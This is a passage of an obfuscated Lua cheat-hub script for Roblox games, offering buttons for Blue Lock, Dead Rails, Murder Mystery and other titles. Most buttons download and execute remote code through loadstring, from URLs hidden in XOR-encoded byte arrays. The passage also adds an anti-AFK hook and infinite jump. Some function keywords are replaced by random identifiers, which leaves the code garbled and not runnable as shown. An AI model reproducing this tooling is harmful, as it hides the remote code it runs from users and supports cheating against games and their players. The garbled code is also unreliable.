        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,121,70,64,71,0,90,71,75,28,127,70,93,92,65,30,127,92,82,87,64,71,65,90,93,84,64,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,127,92,82,87,86,65})))()
        executednotify(__decrypt({127,70,93,92,65,19,96,80,65,90,67,71}))
   end,
})

_RSb0H0vu:CreateButton({
   Name = __decrypt({97,92,93,90,75,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,82,67,90,29,95,70,82,65,94,92,65,29,93,86,71,28,85,90,95,86,64,28,69,0,28,95,92,82,87,86,65,64,28,7,82,11,11,7,11,85,81,80,2,3,7,4,81,80,80,5,1,80,7,10,86,4,10,4,0,11,7,86,10,82,81,29,95,70,82})))()
        executednotify(__decrypt({97,92,93,90,75,19,123,70,81}))
   end,
})
-- Basketball Zero script with bypass
_Prl1iFSI:CreateButton({
   Name = __decrypt({113,82,95,95,19,112,92,93,71,65,92,95}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,88,71,65,92,95,86,84,95,28,127,114,121,91,70,81,69,1,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,95,82,89,108,91,70,81,108,71,86,64,71,29,95,70,82})))()
        executednotify(__decrypt({113,82,95,95,19,112,92,93,71,65,92,95}))
   end,
})

-- Blue Lock _j2iIWFHz script
_zNMMKlT8:CreateButton({
   Name = __decrypt({127,114,121,19,123,102,113}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,88,71,65,92,95,86,84,95,28,81,95,70,86,95,92,80,88,95,82,89,91,70,81,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,81,95,70,86,108,95,92,80,88,108,94,92,87,29,95,70,82})))()
        executednotify(__decrypt({127,114,121,19,123,102,113}))
   end,
})

_zNMMKlT8:CreateButton({
   Name = __decrypt({99,90,64,88,82,64,90,64,88,82,19,96,80,65,90,67,71}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,99,90,64,88,82,64,90,64,88,82,1,1,1,1,1,28,71,86,64,71,86,65,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,71,86,64,71})))()
        executednotify(__decrypt({99,90,64,88,82,64,90,64,88,82,19,96,80,65,90,67,71}))
   end,
})


_ZhY9aWMs:CreateButton({
   Name = __decrypt({127,114,121,19,123,102,113}),
   Callback = _YEdMAMYy()
       -- Load the script from GitHub
       loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,88,71,65,92,95,86,84,95,28,127,114,121,91,70,81,69,1,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,67,86,71,22,1,3,64,90,94,75})))()
       executednotify(__decrypt({114,90,65,85,95,92,68,19,102,99,119,114,103,118,119}))
   end,
})
-- Muscle Legend _dax1T0oG
_20qY9LoK:CreateSection(__decrypt({126,70,64,80,95,86,19,127,86,84,86,93,87,19,96,80,65,90,67,71,64}))

_20qY9LoK:CreateButton({
   Name = __decrypt({126,70,64,80,95,86,19,127,86,84,86,93,87,19,96,80,65,90,67,71}),
   Callback = _YEdMAMYy()
       loadstring(game:HttpGet((__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,82,91,94,82,87,64,84,82,94,86,65,1,28,96,80,65,90,67,71,30,30,116,82,94,86,28,94,82,90,93,28,126,70,64,80,95,86,30,127,86,84,86,93,87,64})),true))()
       executednotify(__decrypt({126,70,64,80,95,86,19,127,86,84,86,93,87,19,96,80,65,90,67,71}))
   end,
})

-- _DH5Q16oN _dax1T0oG Scripts
_DH5Q16oN:CreateButton({
   Name = __decrypt({122,93,85,90,93,90,71,86,19,106,90,86,95,87,19,117,118}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
       executednotify(__decrypt({122,93,85,90,93,90,71,86,19,106,90,86,95,87,19,117,118}))
   end,
})

_DH5Q16oN:CreateButton({
   Name = __decrypt({119,86,75,19,118,75,67,95,92,65,86,65}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,88,71,65,92,95,86,84,95,28,64,80,65,90,67,71,95,75,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,87,86,75,29,95,70,82})))()
       executednotify(__decrypt({119,86,75,19,118,75,67,95,92,65,86,65}))
   end,
})

_DH5Q16oN:CreateButton({
   Name = __decrypt({123,74,87,65,92,75,90,87,86}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,75,112,91,82,92,71,90,80,101,92,90,87,28,123,74,87,65,92,75,90,87,86,28,94,82,90,93,28,81,86,71,82,29,95,70,82})))()
       executednotify(__decrypt({123,74,87,65,92,75,90,87,86}))
   end,
})

_DH5Q16oN:CreateButton({
   Name = __decrypt({96,90,94,67,95,86,96,67,74}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,4,11,93,28,96,90,94,67,95,86,96,67,74,28,94,82,90,93,28,96,90,94,67,95,86,96,67,74,96,92,70,65,80,86,29,95,70,82})))()
       executednotify(__decrypt({96,90,94,67,95,86,96,67,74}))
   end,
})

_DH5Q16oN:CreateButton({
   Name = __decrypt({127,114,121,19,123,102,113}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source'))()
       executednotify(__decrypt({114,90,65,85,95,92,68,19,102,99,119,114,103,118,119}))
   end,
})

_DH5Q16oN:CreateButton({
   Name = __decrypt({119,92,94,82,90,93,19,107}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/shlexware/DomainX/main/source'))()
       executednotify(__decrypt({119,92,94,82,90,93,19,107}))
   end,
})


-- _VzSaJ1GL _dax1T0oG
local _RNvOa019

local _YEdMAMYy onIdled()
    if game then
        game:GetService(__decrypt({101,90,65,71,70,82,95,102,64,86,65})):CaptureController()
        game:GetService(__decrypt({101,90,65,71,70,82,95,102,64,86,65})):ClickButton2(Vector2.new(0, 0))
    end
end

_VzSaJ1GL:CreateButton({
    Name = __decrypt({114,93,71,90,19,114,117,120}),
    Callback = _YEdMAMYy()
        if game and not _RNvOa019 and game._3S_MEApy._K4CKn_s9.Idled then
            _RNvOa019 = game._3S_MEApy._K4CKn_s9.Idled:Connect(onIdled)
            executednotify(__decrypt({114,93,71,90,19,114,117,120}))
        end
    end,
})

local _Sw9XjjjO = false
local _iqN3aeet = nil

_VzSaJ1GL:CreateToggle({
   Name = __decrypt({122,93,85,90,93,90,71,86,19,121,70,94,67}),
   CurrentValue = false,
   Callback = _YEdMAMYy(Value)
      _Sw9XjjjO = Value
      
      -- Disconnect previous connection if it exists
      if _iqN3aeet then
          _iqN3aeet:Disconnect()
          _iqN3aeet = nil
      end
      
      -- Only create a new connection if _Sw9XjjjO is enabled and in game environment
      if _Sw9XjjjO and game then
          _iqN3aeet = game:GetService(__decrypt({102,64,86,65,122,93,67,70,71,96,86,65,69,90,80,86})).JumpRequest:Connect(_YEdMAMYy()
             if _Sw9XjjjO and game._3S_MEApy._K4CKn_s9.Character then
                game._3S_MEApy._K4CKn_s9.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
             end
          end)
      end
   end,
})

-- Credit section
local _3Uv7Ayin = _EzY_T8OH:CreateSection(__decrypt({112,65,86,87,90,71,64}))

_EzY_T8OH:CreateLabel(__decrypt({112,65,86,82,71,86,87,19,81,74,19,127,114,121,19,123,70,81,19,103,86,82,94}))
_EzY_T8OH:CreateLabel(__decrypt({119,90,64,80,92,65,87,9,19,87,90,64,80,92,65,87,29,84,84,28,7,94,84,87,80,85,69,114,121,102}))
_EzY_T8OH:CreateLabel(__decrypt({96,80,65,90,67,71,19,101,86,65,64,90,92,93,9,19,7,29,2,19,27,96,68,90,85,71,19,112,92,94,67,82,71,90,81,95,86,26}))
_EzY_T8OH:CreateLabel(__decrypt({25,19,124,67,71,90,94,90,73,86,87,19,85,92,65,19,96,68,90,85,71,19,118,75,86,80,70,71,92,65}))

-- Print Swift compatibility notice
print(__decrypt({127,114,121,19,123,102,113,19,30,19,96,68,90,85,71,19,112,92,94,67,82,71,90,81,95,86,19,101,86,65,64,90,92,93}))
print(__decrypt({114,95,95,19,123,103,103,99,19,65,86,66,70,86,64,71,64,19,91,82,69,86,19,81,86,86,93,19,92,67,71,90,94,90,73,86,87,19,85,92,65,19,96,68,90,85,71,19,86,75,86,80,70,71,92,65}))
print(__decrypt({103,91,90,64,19,69,86,65,64,90,92,93,19,90,93,80,95,70,87,86,64,9}))
print(__decrypt({2,29,19,117,70,95,95,19,96,68,90,85,71,19,80,92,94,67,82,71,90,81,90,95,90,71,74}))
print(__decrypt({1,29,19,99,86,71,19,96,90,94,19,10,10,19,108,87,82,75,2,103,3,92,116,19,68,90,71,91,19,93,86,68,19,103,65,82,87,86,19,96,80,82,94,19,101,1}))
print(__decrypt({0,29,19,114,95,95,19,64,80,65,90,67,71,64,19,70,67,87,82,71,86,87,19,71,92,19,68,92,65,88,19,68,90,71,91,19,96,68,90,85,71}))
print(__decrypt({7,29,19,122,94,67,65,92,69,86,87,19,86,75,86,80,70,71,92,65,19,87,86,71,86,80,71,90,92,93}))

-- _j2iIWFHz _dax1T0oG
_j2iIWFHz:CreateSection(__decrypt({108,89,1,90,122,100,117,123,73,19,96,80,65,90,67,71,64}))
 
_j2iIWFHz:CreateButton({
   Name = __decrypt({114,73,70,65,86,19,126,92,87}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,114,80,71,74,65,93,28,96,80,65,90,67,71,64,28,94,82,90,93,28,114,73,70,65,86,126,92,87,87,86,87})))()
        executednotify(__decrypt({114,73,70,65,86,19,126,92,87}))
   end,
})

_j2iIWFHz:CreateButton({
   Name = __decrypt({103,81,82,92,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,71,81,82,92,2,7,0,28,71,91,82,90,81,82,92,28,94,82,90,93,28,103,81,82,92,123,70,81,97,90,69,82,95,64})))()
        executednotify(__decrypt({103,81,82,92,19,123,70,81}))
   end,
})

_j2iIWFHz:CreateButton({
   Name = __decrypt({11,113,90,71,64,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,11,81,90,71,64,7,74,82,28,65,90,69,82,95,64,30,69,0,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,94,82,90,93,29,95,70,82})))()
        executednotify(__decrypt({11,113,90,71,64,19,123,70,81}))
   end,
})

_j2iIWFHz:CreateButton({
   Name = __decrypt({101,86,93,92,75,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest('https://raw.githubusercontent.com/venoxhh/universalscripts/main/rivals/venoxware'))()
        executednotify(__decrypt({101,86,93,92,75,19,123,70,81}))
   end,
})

_j2iIWFHz:CreateButton({
   Name = __decrypt({127,70,93,82,75,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,114,95,86,75,90,64,90,64,81,82,80,88,28,127,70,93,82,75,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,127,92,82,87,86,65,29,95,70,82})))()
        executednotify(__decrypt({127,70,93,82,75,19,123,70,81}))
   end,
})

_j2iIWFHz:CreateButton({
   Name = __decrypt({101,86,93,71,70,65,86,64,29,95,70,82}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,95,82,86,65,82,73,28,69,86,93,71,70,65,86,64,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,65,90,69,82,95,64,29,95,70,82})))()
        executednotify(__decrypt({101,86,93,71,70,65,86,64,29,95,70,82}))
   end,
})

_j2iIWFHz:CreateButton({
   Name = __decrypt({97,92,93,90,75,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,82,67,90,29,95,70,82,65,94,92,65,29,93,86,71,28,85,90,95,86,64,28,69,0,28,95,92,82,87,86,65,64,28,81,6,11,2,87,3,4,81,85,87,2,0,7,85,85,7,86,82,5,2,1,87,5,4,2,0,5,2,81,86,4,4,29,95,70,82})))()
        executednotify(__decrypt({97,92,93,90,75,19,123,70,81}))
   end,
})

_j2iIWFHz:CreateButton({
   Name = __decrypt({99,90,93,84,70,90,93,97,101,96}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,99,102,96,112,97,122,99,103,96,28,99,122,125,116,102,122,125,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,97,90,69,82,95,64,101,2})))()
        executednotify(__decrypt({99,90,93,84,70,90,93,97,101,96}))
   end,
})

_j2iIWFHz:CreateButton({
   Name = __decrypt({105,74,67,91,86,65,90,92,93}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(('https://raw.githubusercontent.com/blackowl1231/ZYPHERION/refs/heads/main/main.lua')))()
        executednotify(__decrypt({105,74,67,91,86,65,90,92,93}))
   end,
})

_j2iIWFHz:CreateButton({
   Name = __decrypt({114,70,71,92,19,117,82,65,94,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,82,67,90,29,95,70,82,65,94,92,65,29,93,86,71,28,85,90,95,86,64,28,69,0,28,95,92,82,87,86,65,64,28,1,2,1,80,2,2,10,11,82,2,81,86,82,80,85,0,2,2,6,3,82,11,80,85,0,0,10,81,82,1,11,11,29,95,70,82})))()
        executednotify(__decrypt({114,70,71,92,19,117,82,65,94,19,123,70,81}))
   end,
})

_j2iIWFHz:CreateButton({
   Name = __decrypt({97,74,81,92,68,19,114,90,94,81,92,71}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest('https://raw.githubusercontent.com/rybowe/rybowescripts/main/release.lua'))()
        executednotify(__decrypt({97,74,81,92,68,19,114,90,94,81,92,71}))
   end,
})

_j2iIWFHz:CreateButton({
   Name = __decrypt({107,86,65,82,19,96,80,65,90,67,71}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,95,70,82,64,80,65,90,67,71,64,97,124,113,127,124,107,28,107,86,65,82,65,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,97,90,69,82,95,64,75,86,65,82,99,113,117})))()
        executednotify(__decrypt({107,86,65,82,19,96,80,65,90,67,71}))
   end,
})

_j2iIWFHz:CreateButton({
   Name = __decrypt({126,90,93,90,94,82,95,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,126,90,93,90,94,82,95,96,80,65,90,67,71,90,93,84,96,86,65,69,90,80,86,28,126,90,93,90,94,82,95,97,90,69,82,95,64,28,94,82,90,93,28,65,90,69,82,95,64,29,95,70,82}),true))()
        executednotify(__decrypt({126,90,93,90,94,82,95,19,123,70,81}))
   end,
})
-- Dead Rails _dax1T0oG
_vjs1GKTq:CreateSection(__decrypt({119,86,82,87,19,97,82,90,95,64,19,96,80,65,90,67,71,64}))

_vjs1GKTq:CreateButton({
   Name = __decrypt({126,82,65,88,88,19,120,86,74,95,86,64,64}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/Markklol/aw/refs/heads/main/Protected/DRailsv2.lua'))()
       executednotify(__decrypt({126,82,65,88,88,19,120,86,74,95,86,64,64}))
   end,
})

_vjs1GKTq:CreateButton({
   Name = __decrypt({117,82,65,75,2,2,2,1,1,19,120,86,74,95,86,64,64}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,117,82,65,75,2,2,2,1,1,28,119,70,67,86,64,64,28,94,82,90,93,28,96,86,80,92,93,87,119,70,67,86})))()
       executednotify(__decrypt({117,82,65,75,2,2,2,1,1,19,120,86,74,95,86,64,64}))
   end,
})

_vjs1GKTq:CreateButton({
   Name = __decrypt({96,67,90,87,86,65,107,123,70,81,19,120,86,74,95,86,64,64}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,96,67,90,87,86,65,96,80,65,90,67,71,97,113,28,119,86,82,87,30,97,82,90,95,64,30,96,67,90,87,86,65,107,123,70,81,30,96,80,65,90,67,71,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,96,67,90,87,86,65,107,123,70,81,22,1,3,1,29,3,29,71,75,71})))()
       executednotify(__decrypt({96,67,90,87,86,65,107,123,70,81,19,120,86,74,95,86,64,64}))
   end,
})
_vjs1GKTq:CreateButton({
   Name = __decrypt({96,71,65,86,95,90,73,90,82,19,120,86,74,95,86,64,64}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/0vma/Strelizia/refs/heads/main/Standalone/_vjs1GKTq.lua', true))()
       executednotify(__decrypt({96,71,65,86,95,90,73,90,82,19,120,86,74,95,86,64,64}))
   end,
})

_vjs1GKTq:CreateButton({
   Name = __decrypt({97,90,93,93,64,19,119,86,82,87,19,97,82,90,95,64,19,125,92,19,120,86,74}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,82,67,90,29,95,70,82,65,94,92,65,29,93,86,71,28,85,90,95,86,64,28,69,0,28,95,92,82,87,86,65,64,28,86,2,80,85,87,10,0,81,2,2,0,82,4,10,4,4,0,87,10,0,1,6,2,81,5,2,82,85,2,86,1,85,29,95,70,82})))()
       executednotify(__decrypt({97,90,93,93,64,19,119,86,82,87,19,97,82,90,95,64,19,125,92,19,120,86,74}))
   end,
})

_vjs1GKTq:CreateButton({
   Name = __decrypt({114,70,71,92,19,117,82,65,94,19,113,92,93,87}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,118,94,67,95,90,80,28,87,86,82,71,91,65,82,90,95,64,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,81,92,93,87})))()
       executednotify(__decrypt({114,70,71,92,19,117,82,65,94,19,113,92,93,87}))
   end,
})

_vjs1GKTq:CreateButton({
   Name = __decrypt({127,92,94,70,19,123,70,81}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/notyourfavorite1/lomuhubmain/refs/heads/main/main.txt', true))()
       executednotify(__decrypt({127,92,94,70,19,123,70,81}))
   end,
})

_vjs1GKTq:CreateButton({
   Name = __decrypt({125,86,92,75,19,123,70,81}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,91,82,64,64,82,93,75,73,82,74,93,30,95,70,82,28,125,118,124,107,123,102,113,126,114,122,125,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,95,92,82,87,86,65}), true))()
       executednotify(__decrypt({125,86,92,75,19,123,70,81}))
   end,
})

_vjs1GKTq:CreateButton({
   Name = __decrypt({96,74,67,91,86,65,19,123,70,81,19,124,99}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,93,92,80,71,70,65,93,82,95,5,0,2,28,119,86,82,87,30,65,82,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,126,94,94})))()
       executednotify(__decrypt({96,74,67,91,86,65,19,123,70,81,19,124,99}))
   end,
})

_vjs1GKTq:CreateButton({
   Name = __decrypt({103,81,82,92,19,123,70,81}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,71,81,82,92,2,7,0,28,71,91,82,90,81,82,92,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,103,81,82,92,123,70,81,119,86,82,87,97,82,90,95,64})))()
       executednotify(__decrypt({103,81,82,92,19,123,70,81}))
   end,
})

_vjs1GKTq:CreateButton({
   Name = __decrypt({120,82,65,92,95,19,123,70,81}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,120,82,65,92,95,94,93,10,10,3,3,28,88,82,65,92,95,91,70,81,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,64,80,65,90,67,71})))()
       executednotify(__decrypt({120,82,65,92,95,19,123,70,81}))
   end,
})

_vjs1GKTq:CreateButton({
   Name = __decrypt({119,86,82,87,19,97,82,90,95,64,19,114,95,67,91,82,19,96,80,65,90,67,71}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,84,70,94,82,93,81,82,28,96,80,65,90,67,71,64,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,108,69,89,64,2,116,120,103,66}), true))()
       executednotify(__decrypt({119,86,82,87,19,97,82,90,95,64,19,114,95,67,91,82,19,96,80,65,90,67,71}))
   end,
})

_vjs1GKTq:CreateButton({
   Name = __decrypt({127,114,121,19,123,102,113}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,82,67,90,29,95,70,82,65,94,92,65,29,93,86,71,28,85,90,95,86,64,28,69,0,28,95,92,82,87,86,65,64,28,1,6,6,82,80,6,5,4,80,86,87,0,87,80,81,10,86,5,10,82,82,4,86,7,7,80,7,1,0,85,2,10,29,95,70,82})))()
       executednotify(__decrypt({114,90,65,85,95,92,68,19,102,99,119,114,103,118,119}))
   end,
})

_vjs1GKTq:CreateButton({
   Name = __decrypt({127,114,121,19,123,102,113}),
   Callback = _YEdMAMYy()
       loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,122,93,85,86,65,93,70,64,96,80,65,90,67,71,64,28,125,70,95,95,30,117,90,65,86,28,94,82,90,93,28,127,92,82,87,86,65})))()
       executednotify(__decrypt({114,90,65,85,95,92,68,19,102,99,119,114,103,118,119}))
   end,
})

-- _g_3i2Ca3 _dax1T0oG Scripts
_g_3i2Ca3:CreateSection(__decrypt({113,95,92,75,19,117,65,70,90,71,64,19,96,80,65,90,67,71,64}))

-- Murder Mystery _dax1T0oG Content 
_VeEsFAZI:CreateSection(__decrypt({55310,56598,19,126,102,97,119,118,97,19,126,106,96,103,118,97,106,19,112,124,126,122,125,116,19,96,124,124,125,19,55310,56598})) 

_VeEsFAZI:CreateLabel(__decrypt({112,124,126,122,125,116,19,96,124,124,125,19,100,114,122,103,19,127,122,127,19,113,97,124})) 

_VeEsFAZI:CreateParagraph({ 
    Title = __decrypt({102,93,87,86,65,19,119,86,69,86,95,92,67,94,86,93,71}), 
    Content = __decrypt({103,91,86,19,126,70,65,87,86,65,19,126,74,64,71,86,65,74,19,64,80,65,90,67,71,19,90,64,19,80,70,65,65,86,93,71,95,74,19,90,93,19,87,86,69,86,95,92,67,94,86,93,71,19,82,93,87,19,68,90,95,95,19,81,86,19,82,69,82,90,95,82,81,95,86,19,90,93,19,82,19,85,70,71,70,65,86,19,70,67,87,82,71,86,29,19,99,95,86,82,64,86,19,80,91,86,80,88,19,81,82,80,88,19,95,82,71,86,65,19,85,92,65,19,71,91,90,64,19,86,75,80,90,71,90,93,84,19,82,87,87,90,71,90,92,93,19,71,92,19,127,114,121,19,123,102,113,18}) 
}) 

_VeEsFAZI:CreateButton({ 
    Name = __decrypt({121,92,90,93,19,119,90,64,80,92,65,87,19,85,92,65,19,102,67,87,82,71,86,64}), 
    Callback = _YEdMAMYy() 
        setclipboard(__decrypt({91,71,71,67,64,9,28,28,87,90,64,80,92,65,87,29,84,84,28,7,94,84,87,80,85,69,114,121,102})) 
        _32HG_vZP:Notify({ 
            Title = __decrypt({119,90,64,80,92,65,87,19,127,90,93,88,19,112,92,67,90,86,87}), 
            Content = __decrypt({103,91,86,19,119,90,64,80,92,65,87,19,95,90,93,88,19,91,82,64,19,81,86,86,93,19,80,92,67,90,86,87,19,71,92,19,74,92,70,65,19,80,95,90,67,81,92,82,65,87,18}), 
            Duration = 5, 
            Image = 9725800107, 
            Actions = { 
                Ignore = { 
                    Name = __decrypt({124,120}), 
                    Callback = _YEdMAMYy() end 
                } 
            } 
        }) 
    end 
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({100,92,95,85,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,95,90,93,88,29,71,65,68,75,73,29,80,92,94,28,127,96,30,100,92,95,85,30,123,70,81})))()
        executednotify(__decrypt({100,92,95,85,19,123,70,81}))
   end,
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({97,122,99,99,118,97,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,91,82,89,90,81,86,73,82,28,126,92,87,70,95,86,28,94,82,90,93,28,126,92,81,90,95,86,108,96,80,65,90,67,71,29,95,70,82})))()
        executednotify(__decrypt({97,122,99,99,118,97,19,123,70,81}))
   end,
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({103,123,102,125,119,118,97,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,103,91,70,93,87,86,65,105,30,123,102,113,28,123,102,113,28,94,82,90,93,28,97,86,94,82,88,86,126,92,81,90,95,86,103,86,64,71})))()
        executednotify(__decrypt({103,123,102,125,119,118,97,19,123,70,81}))
   end,
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({126,114,103,96,102,125,118,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,106,82,71,64,70,65,82,82,28,126,82,71,64,70,93,86,28,94,82,90,93,28,126,82,71,64,70,93,86,81,86,71,82,29,95,70,82})))()
        executednotify(__decrypt({126,114,103,96,102,125,118,19,123,70,81}))
   end,
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({126,122,125,19,96,118,114,116,114,103,118,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,112,91,86,86,94,64,125,91,70,112,91,90,114,95,28,126,90,93,116,82,94,90,93,84,123,70,81,28,94,82,90,93,28,94,90,93,84,82,94,90,93,84,70,67,87,82,71,86,93,86,68})))()
